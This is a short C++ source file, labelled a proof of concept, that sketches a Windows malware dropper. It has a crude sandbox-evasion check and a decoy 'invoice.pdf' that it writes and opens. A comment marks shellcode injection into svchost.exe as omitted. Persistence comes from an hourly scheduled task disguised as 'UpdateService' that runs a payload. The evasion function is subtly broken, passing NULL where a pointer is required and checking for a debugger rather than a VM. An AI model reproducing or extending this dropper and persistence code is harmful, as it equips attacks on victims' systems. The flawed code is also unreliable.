// WARNING: Proof-of-concept only. Do NOT execute.  
#include <windows.h>  
#include <fstream>  

// Anti-VM check (crude example)  
bool isVM() {  
    return (CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL) || FindWindowA("VBoxTrayToolWndClass", NULL));  
}  

// Dropper: Decoy PDF + injects payload  
void deploy() {  
    if (!isVM()) {  
        std::ofstream decoy("invoice.pdf"); // Malicious PDF placeholder  
        ShellExecuteA(NULL, "open", "invoice.pdf", NULL, NULL, SW_SHOW);  
        // Inject shellcode into svchost.exe (omitted for safety)  
    }  
}  

// Persistence via scheduled tasks  
void persist() {  
    system("schtasks /create /tn \"UpdateService\" /tr \"C:\\payload.exe\" /sc hourly");  
}  

int main() {  
    deploy();  
    persist();  
    return 0;  
}  
